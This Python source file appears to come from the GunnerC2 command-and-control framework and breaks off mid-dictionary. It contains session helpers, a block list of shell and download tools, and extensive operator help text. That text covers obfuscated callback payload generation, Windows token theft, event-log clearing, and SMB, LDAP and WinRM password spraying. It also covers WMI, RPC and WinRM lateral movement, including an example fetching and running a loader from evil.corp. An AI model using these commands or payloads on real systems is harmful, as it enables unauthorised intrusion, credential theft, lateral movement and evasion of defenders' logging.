import random
import string
import os, sys, subprocess
from core.session_handlers import session_manager, sessions
from core.prompt_manager import prompt_manager
import re
import readline
import base64

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

tcp_listener_sockets = {}
tls_listener_sockets = {}
http_listener_sockets = {}
https_listener_sockets = {}
portforwards = {}

class SessionDefender:
	def __init__(self):
		self.is_active = True

		# commands that spawn a new shell / interpreter on Windows
		self.win_dangerous = {
			"powershell", "powershell.exe", "cmd", "cmd.exe",
			"curl", "wget", "telnet",
			"python", "python3", "php", "ruby", "irb", "perl",
			"jshell", "node", "ghci"
		}

		# editors & shells on Linux + same interpreters
		self.linux_dangerous = {
			"bash", "sh", "zsh", "tclsh",
			"less", "more", "nano", "pico", "vi", "vim", "gedit", "atom", "emacs", "telnet"
		} | self.win_dangerous

		# regexes for unclosed quotes/backticks
		self._pairings = [
			(r"(?<!\\)'", r"'"),
			(r'(?<!\\)"', r'"'),
			(r"(?<!\\)`", r"`"),
		]

	def inspect_command(self, os_type: str, cmd: str) -> bool:
		"""
		Return True if the command is safe to send, False if it should be blocked.
		"""

		if not cmd:
			return True

		if not self.is_active:
			return True

		# 1) Unclosed quotes/backticks
		for pattern, char in self._pairings:
			if len(re.findall(pattern, cmd)) % 2 != 0:
				return False

		# 2) Trailing backslash (Linux only)
		if os_type == "linux" and cmd.rstrip().endswith("\\"):
			return False

		# 3) Dangerous binaries
		first = cmd.strip().split()[0].lower()
		if os_type == "windows":
			if first in self.win_dangerous:
				return False
		else:
			if first in self.linux_dangerous:
				return False

		# safe
		return True


def gen_session_id():
	return '-'.join(
		''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
		for _ in range(3)
	)

PROMPT_PATTERNS = [
	re.compile(r"^PS [^>]+> ?"),         # PowerShell prompt
	re.compile(r"^[\w\-\@]+[:~\w\/-]*[#$] ?"), # bash/zsh prompt
	re.compile(r"^[A-Za-z]:\\.*> ?"),  #CMD shell prompt
	# add more if you spawn e.g. cmd.exe, fish, etc.
]

def normalize_output(raw: str, last_cmd: str) -> str:
	"""
	1) Strip the echoed command
	2) Remove any lines matching known prompts
	3) Trim leading/trailing whitespace
	"""
	lines = raw.splitlines()

	# 1) if the first non‑empty line equals our command, drop it
	if lines and lines[0].strip() == last_cmd.strip():
		lines.pop(0)

	# 2) filter out any lines that look like a prompt
	def is_prompt(line: str) -> bool:
		for pat in PROMPT_PATTERNS:
			if pat.match(line):
				return True
		return False

	cleaned = [l for l in lines if not is_prompt(l)]

	# 3) join & strip
	return "\n".join(cleaned).strip()



def list_sessions():
	if not session_manager.sessions:
		print(brightyellow + "No active sessions.")

	print(brightgreen + (f"{'SID':<20} {'Alias':<15} {'Transport':<10} {'Hostname':<20} {'User':<25} {'OS':<10} {'Arch':<10}"))
	print(brightgreen +("-" * 110))

	for sid, session in session_manager.sessions.items():
		transport = session.transport
		meta = session.metadata

		hostname = meta.get("hostname", "N/A")
		user = meta.get("user", "N/A")
		os_info = meta.get("os")
		arch = meta.get("arch", "N/A")

		# Resolve alias if set
		alias = "N/A"
		for a, real_sid in session_manager.alias_map.items():
			if real_sid == sid:
				alias = a
				break


		if sid is None or transport is None or hostname is None or user is None or os_info is None or arch is None or alias is None:
			print(brightyellow + "Fetching metadata from agent please wait")
			continue
		else:
			print(brightred + (f"{sid:<20} {alias:<15} {transport:<10} {hostname:<20} {user:<25} {os_info:<10} {arch:<10}"))


def list_listeners():
	if not tcp_listener_sockets and not http_listener_sockets and not tls_listener_sockets and not https_listener_sockets:
		print(brightyellow + "No active listeners.")
	else:
		if http_listener_sockets:
			print(brightgreen + "\n[HTTP Listeners]")
			for name in http_listener_sockets:
				print(brightgreen + (f"- {name}"))

		if https_listener_sockets:
			print(brightgreen + "\n[HTTPS Listeners]")
			for name in https_listener_sockets:
				print(brightgreen + (f"- {name}"))

		if tcp_listener_sockets:
			print(brightgreen + "\n[TCP Listeners]")
			for name in tcp_listener_sockets:
				print(brightgreen + (f"- {name}"))

		if tls_listener_sockets:
			print(brightgreen + "\n[TLS Listeners]")
			for name in tls_listener_sockets:
				print(brightgreen + (f"- {name}"))

def shutdown():
	try:
		for name, sock in tcp_listener_sockets.items():
			try:
				sock.close()
				print(brightyellow + f"Closed TCP {name}")

			except:
				pass

	except Exception:
		pass

	try:
		for name, httpd in http_listener_sockets.items():
			try:
				httpd.shutdown()
				print(brightyellow + f"Closed HTTP {name}")

			except Exception as e:
				print(brightred + f"[!] Failed to shutdown HTTP {name}: {e}")

	except Exception:
		pass

	try:
		for name, httpd in https_listener_sockets.items():
			try:
				httpd.shutdown()
				print(brightyellow + f"Closed HTTPS {name}")

			except Exception as e:
				print(brightred + f"[!] Failed to shutdown HTTPS {name}: {e}")

	except Exception:
		pass


def async_note(msg, prompt, reprint=False, firstnewline=True, secondnewline=True, blockprompt=False):
	"""
	Prints msg on its own line, then re-draws `prompt`
	and whatever the user has typed so far.
	"""
	buffer = readline.get_line_buffer()

	# 2. Move to new line
	if firstnewline is True:
		sys.stdout.write('\r\n')

	# 3. Print the actual message
	if secondnewline is True:
		sys.stdout.write(msg + '\r\n')

	else:
		sys.stdout.write(msg)

	if blockprompt is True:
		prompt_manager.block_next_prompt = True
		return

	if reprint is False and blockprompt is False:
		readline.redisplay()

	else:

		if buffer is not None and all(nl not in buffer for nl in ("\n", "\r", "\r\n")) and buffer:
			sys.stdout.write(prompt + buffer)

		else:
			sys.stdout.write(prompt)

		# 5. Flush to make sure it appears immediately
		sys.stdout.flush()

def register_forward(rule_id, sid, local_host, local_port, remote_host, remote_port, thread, listener):
	"""
	Register an active port-forward rule.

	Args:
		rule_id (str): Unique identifier for this forward.
		sid (str): Session ID.
		local_host (str): Local host/interface to bind.
		local_port (int): Local port to listen on.
		remote_host (str): Remote host to forward to.
		remote_port (int): Remote port to forward to.
		thread (threading.Thread): Thread handling this forward.
		listener (socket.socket): Listening socket for this forward.
	"""
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
	portforwards[rule_id] = {
		"sid": display,
		"local_host": local_host,
		"local": local_port,
		"remote": f"{remote_host}:{remote_port}",
		"thread": thread,
		"listener": listener
	}

def unregister_forward(rule_id):
	"""
	Remove and stop a port-forward rule, closing its listener and joining its thread.
	"""
	entry = portforwards.pop(rule_id, None)
	if not entry:
		return
		
	try:
		entry["listener"].close()

	except:
		pass

	entry["thread"].join(timeout=1)

def list_forwards():
	"""
	Return all currently registered port-forward rules.
	"""
	return portforwards


commands = {
	"start": {
		"_desc": """start <subcommand>

Subcommands:
	start http   <ip> <port>   Start HTTP listener
	start https  <ip> <port>   Start HTTPS listener
	start tcp    <ip> <port>   Start TCP listener
	start tls    <ip> <port>   Start TLS‑wrapped TCP listener

Type 'help start http', 'help start https', 'help start tcp' or 'help start tls' for more details.""",

		"http": """start http <ip> <port>\nStarts an HTTP listener on the specified IP and port.\nExample: start http 0.0.0.0 443""",
		"https": """start https <ip> <port> [-c <certfile> -k <keyfile>]
Starts an HTTPS listener on the specified IP and port. If no cert/key are provided, a self-signed certificate will be generated.

Options:
	-c <certfile>
		Path to TLS certificate (PEM format)
	-k <keyfile>
		Path to TLS private key (PEM format)

Examples:
	start https 0.0.0.0 8443
	start https 0.0.0.0 8443 -c cert.pem -k key.pem""",
		"tcp": """start tcp <ip> <port>
Starts a TCP listener. By default runs raw TCP, add --ssl (and optionally -c/-k) to enable TLS.

Examples:
	start tcp 0.0.0.0 9001                                  # raw TCP listener
	start tcp 0.0.0.0 9001 --ssl                            # TLS with generated self-signed cert""",

		"tls": """start tls <ip> <port> [-c <certfile> -k <keyfile>]

Starts a TLS‑wrapped TCP listener.

Options:
	-c <certfile>   Path to TLS certificate file (optional)
	-k <keyfile>    Path to TLS key file (optional)

Example:
	start tls 0.0.0.0 9001
""",
	},

	"portfwd": {
	"_desc": """portfwd <subcommand>
Subcommands:
	portfwd add    -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
	portfwd list
	portfwd delete -i <rule_id>

Type 'help portfwd <subcommand>' for more details.""",
	"add": """portfwd add -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
Start a new port-forward on session <sid>. On Linux agents this will upload chisel and establish the reverse tunnel.

Example:
	portfwd add -i session123 -lh 127.0.0.1 -lp 8000 -rh 10.0.0.5 -rp 443 -cp 7070""",
	"list": """portfwd list
List all currently active port-forward rules.""",
	"delete": """portfwd delete -i <rule_id>
Remove the specified port-forward by rule ID.

Example:
	portfwd delete -i 1"""
},
	"sessions": """sessions\nLists all active sessions with metadata: hostname, user, OS, architecture.""",
	"listeners": """listeners\nLists all currently running HTTP, HTTPS, and TCP listeners.""",
	"alias": """alias <OLD_SID_or_ALIAS> <NEW_ALIAS>\nAssign an alias to a session ID for easier reference. Example: alias abc12-def34-ghi56 pwned""",
	"shell": """shell <session_id>\nStarts an interactive shell with a specific session ID.\nExample: shell gunner""",
	"kill": """kill -i <session_id>\n\nTerminates the specified session (HTTP, HTTPS or TCP).\n\nExample:\n  kill -i abc123""",
	"jobs": """jobs [--print] [-i <job_id>]
Lists background jobs or prints a job’s buffered output.

Usage:
	jobs
	List all background jobs with their ID, Module and Status.

	jobs --print -i <job_id>
	Show the captured stdout/stderr for the given job ID.

Examples:
	jobs
	jobs --print -i 1
""",
	"generate": """generate - Build a new agent payload.

USAGE:
	generate -f <format> -p <payload> [OPTIONS...]

REQUIRED:
	-f, --format <format>         Output format: ps1 | bash
	-p, --payload <type>          Payload type: tcp | http | https
	-lh, --local_host <host>      IP address to connect back to
	-lp, --local_port <port>      Port to connect back to

OPTIONAL:
	-obs, --obfuscation <level>   Obfuscation level: 1 | 2 | 3
	-o, --output <file>           Save payload to file
	--os <windows|linux>          Target OS (default: windows)
	--ssl                         Use SSL/TLS (tcp only)
	--interval <seconds>          Beacon interval (http/https only)
	-H, --headers <headers>       Add custom HTTP headers (http/https only)
								Accepts: "Header: Value" or JSON dict
	--useragent <string>          Custom User-Agent string
	--accept <value>              Accept header value
	--range <value>               Range header value (e.g., "--range 1024")

EXAMPLES:

	TCP payload:
	generate -f ps1 -p tcp -lh 192.168.1.10 -lp 9001 -obs 3

	HTTP payload with headers:
	generate -f ps1 -p http -lh 192.168.1.10 -lp 8080 --interval 5 -H '{"User-Agent": "GunnerC2/version 2.7.2", "Custom-API-Key": "bvhjdghhee7888h"}' -obs 2

	HTTPS payload:
	generate -f ps1 -p https -lh 192.168.1.10 -lp 8443 --interval 10 -obs 1
""",
	"exec": """exec -i <session_id> <command> [args...]
Execute an arbitrary OS command on the specified session (supports wildcards).
Examples:
	exec -i abc123 whoami /all
	exec -i abc123 ls -la /tmp
""",
	"download": """download -i <session_id> -f <remote_file> -o <local_file>\n-i <session_id>   Specify the session ID from which to download the file.\n-f <remote_file>  The path of the remote file to download.\n-o <local_file>   The local path where the file will be saved.\n\nExample:\ndownload -i 12345 -f /home/user/file.txt -o /tmp/file.txt""",
	"upload": """upload -i <session_id> -l <local_file> -r <remote_file>\n-i <session_id>   Specify the session ID to which to upload the file.\n-l <local_file>   The local file to upload.\n-r <remote_file>  The path on the remote system to upload the file to.\n\nExample:\nupload -i 12345 -l /tmp/localfile.txt -r /home/user/remotefile.txt""",
	"banner": """banner
Clears the screen and displays the GUNNER ASCII-art banner.
Example: banner
""",
"search": """search <keyword>
Searches for available modules that match the provided keyword. Supports partial matching.

Example:
	search whoami
	search windows/x64
""",
"use": """use <module_name_or_number>
Selects a module by its full path or the number shown in the last `search` results, then enters its module prompt.

Inside the module prompt:
	show options       - List all configurable options
	set <opt> <value>  - Set a module option
	info               - Show module description and options
	run                - Execute the module
	back               - Exit module prompt and return to main

Examples:
	use linux/privilege_escalation/linpeas
	use 4
""",
"shelldefence": """shelldefence <on|off>
Toggle the Session-Defender runtime checks.

Usage:
	shelldefence on    Enable command‐inspection guard
	shelldefence off   Disable command‐inspection guard""",
	"gunnershell": """gunnershell <session_id_or_alias>
Starts a Meterpreter-style Gunner subshell on the specified session."""
}


# -----------------------------------------------------------------------------
# GunnerShell mini–help
# -----------------------------------------------------------------------------
gunnershell_commands = {
	"list":    "Show all available modules.",
	"help":    "Show this help menu.",
	"banner": """Clears the screen and displays the GUNNER ASCII-art banner.""",
	"sessions": """sessions\nLists all active sessions with metadata: hostname, user, OS, architecture.""",
	"alias": """alias <OLD_SID_or_ALIAS> <NEW_ALIAS>\nAssign an alias to a session ID for easier reference. Example: alias abc12-def34-ghi56 pwned""",
	"exit":    "Exit the GunnerShell subshell and return to main prompt.",
	"upload":  "Usage: upload <local_path> <remote_path>    Upload a file.",
	"download":"Usage: download <remote_path> <local_path>  Download a file.",
	"shell":   "Usage: shell    Drop into a full interactive shell.",
	"switch": "switch <session_id>   Launch a Gunnershell on another session (can't switch to yourself).",
	"portfwd": {
		"_desc": """portfwd <subcommand>
		
Subcommands:
	portfwd add    -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
	portfwd list
	portfwd delete -i <rule_id>

Type 'help portfwd <subcommand>' for more details.""",
		"add": """portfwd add -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
Start a new port-forward on session <sid>. On Linux agents this will upload chisel and establish the reverse tunnel.

Example:
	portfwd add -i session123 -lh 127.0.0.1 -lp 8000 -rh 10.0.0.5 -rp 443 -cp 7070""",
		"list": """portfwd list
List all currently active port-forward rules.""",
		"delete": """portfwd delete -i <rule_id>
Remove the specified port-forward by rule ID.

Example:
	portfwd delete -i 1""",
	},

	"modhelp":  "modhelp <module_name>\n    Show options and usage for the named module.",
	"run":      "run <module_name> [opt=val]\n    Execute module with inline option assignments.",
	"search": """search <keyword>
Searches for available modules that match the provided keyword. Supports partial matching.

Example:
	search whoami
	search windows/x64
""",
	# ────────────────────────────────────────────────────────────────────────────────
	# File system commands help
	# ────────────────────────────────────────────────────────────────────────────────
	"ls":   "ls [<path>]\n    List files on the remote host (defaults to current working directory).",
	"cat":  "cat <filepath>\n    Read and display the contents of the given file.",
	"cd":   "cd <path>\n    Change the remote working directory to <path>.",
	"pwd":  "pwd\n    Print the current remote working directory.",
	"cp":   "cp <src> <dst>   Copy file on the remote host.",
	"mv":        "Move or rename a file/directory",
	"rmdir":     "Remove a directory (recursive)",
	"checksum":  "Compute SHA256 of a file",
	"del":  "del <file>   Delete a file on the remote host.",
	"rm":   "Alias for del",
	"mkdir":"mkdir <path>   Create a directory on the remote host.",
	"md":   "Alias for mkdir",
	"touch":"touch <path>   Create or update a file on the remote host",
	"drives":   "List mounted drives/filesystems",
	"edit": "edit <path>\n    Download, verify text, open in $EDITOR, then re-upload.",
	# ────────────────────────────────────────────────────────────────────────────────
	# Networking Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"netstat":   "netstat\n    Show active TCP/UDP connections on the remote host.",
	"ifconfig":  "ifconfig / ipconfig\n    Display network interfaces.",
	"arp":       "arp\n    Display the ARP cache.",
	"resolve":   "resolve <host>\n    Resolve a hostname on the remote system.",
	"nslookup":  "Alias for resolve",
	"route":     "route\n    View the remote host’s routing table.",
	"getproxy":  "getproxy\n    Display the remote Windows proxy settings.",
	"ipconfig":  "ipconfig    Display network interfaces (Windows: ipconfig /all; Linux/macOS: ifconfig -a)",
	"ifconfig":  "Alias for ipconfig",
	"portscan": """portscan [-Pn] <IP_or_subnet>
Scan common TCP ports on one host or a /24 (ARP-primes gateway/targets, skips unreachable hosts).
Use -Pn to skip the ICMP “alive” check.""",
	"hostname":   "Display the remote host’s hostname",
	"socks": """socks -lh <local_host> -sp <socks_port> -lp <local_port>

Establish a reverse SOCKS5 proxy via the agent.
	Flags:
		-lh  Your C2 IP (where the agent will connect back)
		-sp  SOCKS5 port on your C2 (what proxychains should point at)
		-lp  Local port for Reverse Handler

Example:
	socks -lh 127.0.0.1 -sp 1080 -lp 1090""",
	# ────────────────────────────────────────────────────────────────────────────────
	# System Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"sysinfo":   "sysinfo\n    Display system information (OS, hostname, arch).",
	"ps":        "ps\n    List running processes on the remote host.",
	"getuid":    "getuid\n    Show the user the server is running as.",
	"getprivs":  "getprivs\n    Show/enumerate process privileges.",
	"getpid":    "getpid\n    Print the process ID of the remote agent.",
	"steal_token": """
Usage:
	steal_token <PID> -f <format> -p <tcp-win|http-win|https-win>
				 -lh <local_host> -lp <local_port> -x <http_port>
				 [--serve_https] [--ssl] [-obs <1|2|3>]
				 [--beacon_interval <sec>]

Description:
	Steal a Windows token via CreateProcessWithTokenW and immediately spawn
	a stage-1 PowerShell payload on the target.

Options:
	-f, --format <format>            Payload format (only “ps1” supported)
	-p, --payload <tcp-win|http-win|https-win>
									 Which stager to use
	-lh, --local_host <ip>           IP for the stager to call back to
	-lp, --local_port <port>         Port for the stager callback
	-x,  --http_port <port>          Port for the temporary HTTP(S) server
		--serve_https                Serve the stage-1 script over HTTPS
									 (self-signed cert)
		--ssl                        Force SSL on the reverse shell channel
	-obs <1|2|3>                     Obfuscation strength (1=low, 3=high)
		--beacon_interval <sec>      Beacon interval (required for http-win/https-win)
""",
	"getenv":    "getenv <VAR1> [<VAR2> ...]\n    Retrieve one or more environment variables from the remote host.",
	"exec":      "exec <command> [args...]\n    Execute an arbitrary OS command.",
	"kill":      "kill <pid>\n    Terminate the given process ID.",
	"getsid":    "getsid\n    Show the Windows user SID of the current token.",
	"clearev": """
clearev [-f|--force]
	Clear all Windows event logs. Requires local Administrator or SeSecurityPrivilege;
	use -f/--force to override privilege check.
""",
	"localtime": "Display the remote system’s date and time.",
	"reboot":    "Reboot the remote host immediately.",
	"pgrep":     "pgrep <pattern>   Filter processes by name/pattern",
	"pkill":     "pkill <pattern>   Terminate processes by name/pattern",
	"suspend":  "suspend <pid>\n    Suspend the given process ID.",
	"resume":   "resume <pid>\n    Resume the given suspended process.",
	"shutdown":"shutdown [-r|-h]\n    Shutdown (`-h`) or reboot (`-r`) the host.",
	"reg": {
	"_desc": "reg <query|get|set|delete> …\n    Interact with the Windows registry.",
	"query":  "reg query <hive>\\\\<path> [/s]\n    List subkeys and values (use /s to recurse).",
	"get":    "reg get <hive>\\\\<path> <ValueName>\n    Read a single value.",
	"set":    "reg set <hive>\\\\<path> <Name> <Data>\n    Create or update a string value.",
	"delete": "reg delete <hive>\\\\<path> [/f]\n    Delete a value or entire key (use /f to force).",
	},
	"services":   "services <list|start|stop|restart> [name]   Manage services",
	"netusers":   "netusers    List local user accounts",
	"netgroups":  "netgroups   List local group accounts",
	# ────────────────────────────────────────────────────────────────────────────────
	# User Interface Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"screenshot": "screenshot <local_path>\n    Capture the remote interactive desktop and save it locally.",
	# ────────────────────────────────────────────────────────────────────────────────
	# Lateral Movement Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"winrm": """
winrm -u <username> -p <password> -i <target_ip> (-d <domain> | --local-auth)

Connect via WinRM to a Windows host and run commands or remote scripts.

Required:
	-u <username>      Username for authentication
	-p <password>      Password for authentication
	-i <target_ip>     Target host IP address
	
either:
	-d <domain>         AD domain for network authentication
	--local-auth        Authenticate against local SAM instead of AD

Optional:
	-dc <dc_host>      Domain Controller hostname
	--dc-ip <dc_ip>    Domain Controller IP address
	-c <command>       Command to run on the remote host
	--exec-url         URL of a PowerShell script to fetch & run in memory
	--script           Path to a local PS1 script to upload & execute
	--debug            Enable verbose output
	--stager           Download & IEX payload.ps1 via HTTP stager
	--stager-port      Port for HTTP stager (default 8000)
	--stager-ip        IP of HTTP stager server

Examples:
	winrm -u administrator -p P@ssw0rd! -d CORP.local --dc-ip 10.0.0.50 -i 10.0.0.20 -c whoami
	winrm -u svcacct -p S3rv!c3 --local-auth -i 10.0.0.20 --exec-url http://evil.corp/loader.ps1""",

		"rpcexec": """rpcexec -u <users.txt|username> -p <passes.txt|password> -d <DOMAIN> -t <targets> --command <cmd> [--cleanup]
RPC Exec via COM Scheduled-Task API on the target(s).

Required:
	-u, --users     Username or path to a username file
	-p, --passes    Password or path to a password file
	-d, --domain    AD domain name
	-t, --targets   Target or Comma‑separated list of hosts/IPs
	--command       Command to run on the target(s)

Optional:
	--cleanup       Delete scheduled task after execution
	--debug         Enable verbose output
	--stager        Download & IEX payload.ps1 via HTTP stager
	--stager-port   Port for HTTP stager (default 8000)
	--stager-ip     IP of HTTP stager server

Examples:
	rpcexec -u admin -p P@ssw0rd! -d CORP.local -t 10.0.0.5 --command whoami
	rpcexec --users users.txt --passes passes.txt -d corp.local -t dc1,dc2 --command "ipconfig /all" --cleanup""",


		"netexec": {
		"_desc": """netexec <subcommand>

Subcommands:
	smb     Spray SMB logins against \\<host>\\C$ (or IPC$) and report SUCCESS/INVALID.
	ldap    Spray LDAP credentials against a DC.
	winrm   Spray WinRM credentials via Test-WSMan (HTTP/HTTPS).

Type ‘help netexec smb’ for details on the smb subcommand.""",
		"smb": """
netexec smb -u <users.txt|username> -p <passes.txt|password> -d <DOMAIN> -t <targets> [--shares]

Spray SMB logins in‑memory via PowerShell or enumerate remote shares.

Required:
	-u <path|user>    Username for SMB or path to a username file
	-p <path|pass>    Password for SMB or path to a password file
	-t <targets>      Single target, Comma‑separated IPs or CIDRs

Optional:
	-d <DOMAIN>       AD domain for authentication
	--shares          Enumerate remote SMB shares instead of spraying logins (requires -u and -p to be **single** credentials, not files)
	--stager          Download & IEX payload.ps1 via HTTP stager
	--stager-port     Port for HTTP stager (default 8000)
	--stager-ip       IP of HTTP stager server

Examples:
	netexec smb -u ~/users.txt -p ~/passes.txt -d bank.local -t 10.0.1.0/24
	netexec smb -u admin -p "P@ssw0rd" -d WORKGROUP -t 10.0.1.15 --shares""",

	"ldap": """
netexec ldap -u <user.txt|user> -p <pass.txt|pass> -d <DOMAIN> --dc <host|ip> [--ldaps] [--port <port>] [--debug]

Spray domain credentials via LDAP or LDAPS (DirectorySearcher / LdapConnection) or AD module if available.

Required:
	-u <path|user>       Username or file of usernames
	-p <path|pass>       Password or file of passwords
	-d <DOMAIN>          AD domain name
	--dc <host|ip>       Domain Controller to target

Optional:
	--ldaps              Use LDAPS instead of plain LDAP (enables SSL)
	--port <port>        Port for LDAP or LDAPS (default: 389 or 636 if --ldaps)
	--debug              Enable verbose output (show bind errors, fallbacks, etc.)
	--stager             Download & IEX payload.ps1 via HTTP stager
	--stager-port        Port for HTTP stager (default 8000)
	--stager-ip          IP of HTTP stager server

Example:
	netexec ldap -u users.txt -p passes.txt -d sequel.htb --dc 10.0.0.5 --ldaps --port 636 --debug""",

	"winrm": """
netexec winrm -u <user|file> -p <pass|file> -d <DOMAIN> -t <targets> [--port <port>] [--https]

Spray WinRM credentials via Test-WSMan.
Required:
	-u, --users    Username or file of usernames
	-p, --passes   Password or file of passwords
	-d, --domain   AD domain name
	-t, --targets  Comma‑sep list of hosts/IPs

Optional:
	--port         WinRM port (5985 or 5986)
	--https        Use HTTPS (default port 5986)
	--stager       Download & IEX payload.ps1 via HTTP stager
	--stager-port  Port for HTTP stager (default 8000)
	--stager-ip    IP of HTTP stager server"""
	},
	"wmiexec": """
wmiexec -u <user> -p <pass> -d <DOMAIN> -t <target_ip> --command <cmd>

Execute a command remotely via WMI’s Win32_Process.Create.  Does NOT capture stdout by default.

Required:
	-u, --user      Username for auth
	-p, --pass      Password for auth
	-d, --domain    AD domain (or machine name for local)
	-t, --target    Target IP or hostname
	-c, --command   The command line to spawn (e.g. "whoami")

Optional:
	--debug         Return full raw output for troubleshooting
	--stager        Download & IEX payload.ps1 via HTTP stager
	--stager-port   Port for HTTP stager (default 8000)
	--stager-ip     IP of HTTP stager server

Example:
	wmiexec -u Administrator -p P@ssw0rd! -d CORP.LOCAL -t 10.10.10.5 --command whoami
""",
	# ────────────────────────────────────────────────────────────────────────────────
	# Active Directory Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"getusers": """
getusers [-f <username>] [-d <domain>] [--dc-ip <ip>]

	-f, --filter   <username>   Fetch all AD properties for one user.
	-d, --domain   <domain>     AD domain name (FQDN) or NetBIOS.
	--dc-ip        <ip>         IP address of the Domain Controller.

Usage:
	getusers
			List all user SamAccountNames in the current domain.

	getusers -f jdoe
			Return every AD property of user “jdoe”.

	getusers -d corp.local
			List all users in the corp.local domain.

	getusers --dc-ip 10.0.0.50
			List all users by querying the DC at 10.0.0.50.

	getusers -f jdoe -d corp.local --dc-ip 10.0.0.50
			Fetch jdoe’s properties from the specified domain/DC.
""",
	"getgroups": """
getgroups [-g <group>] [-m] [-d <domain>] [--dc-ip <ip>]

	 -g, --group     Specific group SamAccountName to fetch all AD properties for
	 -m, --members   List members of the specified group (requires -g)
	 -d, --domain    AD domain name (FQDN) or NetBIOS
	 --dc-ip         IP address of the Domain Controller

Usage:
	getgroups
			List all group SamAccountNames in the current domain.

	getgroups -g "Domain Admins"
			Fetch every AD property (Name:Value) for the “Domain Admins” group.

	getgroups -g "Domain Admins" -m
			List all members of the “Domain Admins” group.

	getgroups -d corp.local
			Query corp.local’s groups.

	getgroups --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.
""",
	"getcomputers": """
getcomputers [-n <computer>] [-d <domain>] [--dc-ip <ip>]

	 -n, --name     Specific computer SamAccountName to fetch all AD properties for
	 -d, --domain   AD domain name (FQDN) or NetBIOS
	 --dc-ip        IP address of the Domain Controller

Usage:
	getcomputers
			List all computer SamAccountNames in the current domain.

	getcomputers -n HOST01
			Fetch every AD property (Name:Value) for the “HOST01” computer.

	getcomputers -d corp.local
			Query corp.local’s computers.

	getcomputers --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.
""",
	"getdomaincontrollers": """
getdomaincontrollers [-d <domain>] [--dc-ip <ip>] [-e, --enterprise]

  -d, --domain       AD domain name (FQDN) or NetBIOS
  --dc-ip            IP address of the Domain Controller
  -e, --enterprise   Enumerate DCs across the entire forest

Usage:
  getdomaincontrollers
  List every DC in the current domain.

	getdomaincontrollers -d corp.local
			List DCs in corp.local.

	getdomaincontrollers --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.

	getdomaincontrollers -e
			List every DC in every domain in the forest.
""",
	"getous": """
getous [-o <ou>] [-d <domain>] [--dc-ip <ip>]

	 -o, --ou      OU name to fetch all AD properties for
	 -d, --domain  AD domain name (FQDN) or NetBIOS
	 --dc-ip       IP address of the Domain Controller

Usage:
	getous
			List all Organizational Units in the current domain.

	getous -o "Sales"
			Fetch every AD property (Name:Value) for the “Sales” OU.

	getous -d corp.local
			Query corp.local’s OUs.

	getous --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.
""",
	"getgpos": """
getgpos [-n <name>] [-d <domain>] [--dc-ip <ip>]

	 -n, --name   GPO DisplayName to fetch all AD properties for
	 -d, --domain AD domain name (FQDN) or NetBIOS
	 --dc-ip      IP address of the Domain Controller

Usage:
	getgpos
			List all GPO DisplayNames in the current domain.

	getgpos -n "Default Domain Policy"
			Fetch every AD property (Name:Value) for that GPO.

	getgpos -d corp.local
			Query corp.local’s GPOs.

	getgpos --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.
""",
	"getdomain": """
getdomain [-d <domain>] [--dc-ip <ip>]

	 -d, --domain  AD domain name (FQDN) or NetBIOS
	 --dc-ip       IP address of the Domain Controller

Usage:
	getdomain
			Fetch every property (Name:Value) for the current domain.

	getdomain -d corp.local
			Query the corp.local domain.

	getdomain --dc-ip 10.0.0.10
			Query the domain controller at 10.0.0.10.
""",
	"gettrusts": """
gettrusts [-n <trustName>] [-d <domain>] [--dc-ip <ip>]

	 -n, --name    Name of a specific trust to fetch all properties for
	 -d, --domain  AD domain name (FQDN) or NetBIOS
	 --dc-ip       IP address of the Domain Controller

Usage:
	gettrusts
			List all trust relationships in the current domain.

	gettrusts -n "Corp‑ChildTrust"
			Fetch every AD property for the “Corp‑ChildTrust” trust object.

	gettrusts -d corp.local
			Enumerate all trusts for the corp.local domain.

	gettrusts --dc-ip 10.0.0.50
			Enumerate trusts via the DC at 10.0.0.50.
""",
	"getforests": """
getforests [-n <name>] [-d <domain>] [--dc-ip <ip>]

	 -n, --name    Forest DNS name to dump all properties for
	 -d, --domain  AD domain name (FQDN) or NetBIOS (to target a DC)
	 --dc-ip       IP address of the Domain Controller

Usage:
	getforests
			List the DNS names of all forests trusted by the current domain.

	getforests -n corp.local
			Dump every property of the corp.local forest.

	getforests -d corp.local --name corp.local
			Same as above but via SRV lookup of corp.local.

	getforests --dc-ip 10.0.0.50 -n corp.local
			Dump forest properties via the DC at 10.0.0.50.
""",
	"getfsmo": """
getfsmo [-d <domain>] [--dc-ip <ip>]

	 -d, --domain  AD domain name (FQDN) or NetBIOS
	 --dc-ip       IP address of the Domain Controller

Usage:
	getfsmo
			Show which DCs hold the FSMO roles in the current forest.

	getfsmo -d corp.local
			Query FSMO role holders for corp.local.

	getfsmo --dc-ip 10.0.0.50
			Query via the DC at 10.0.0.50.
""",
	"getpwpolicy": """
getpwpolicy [-d <domain>] [--dc-ip <ip>]

	-d, --domain   AD domain name (FQDN) or NetBIOS.
	--dc-ip        IP of the Domain Controller.

Usage:
	getpwpolicy
			Dump Password/Lockout/Kerberos policies in the current domain.

	getpwpolicy -d corp.local --dc-ip 10.0.0.50
			Same, but query a specific DC.
""",
		"getdelegation": """
getdelegation [-d <domain>] [--dc-ip <ip>]

	-d, --domain   AD domain name (FQDN) or NetBIOS.
	--dc-ip        IP of the Domain Controller.

Usage:
	getdelegation
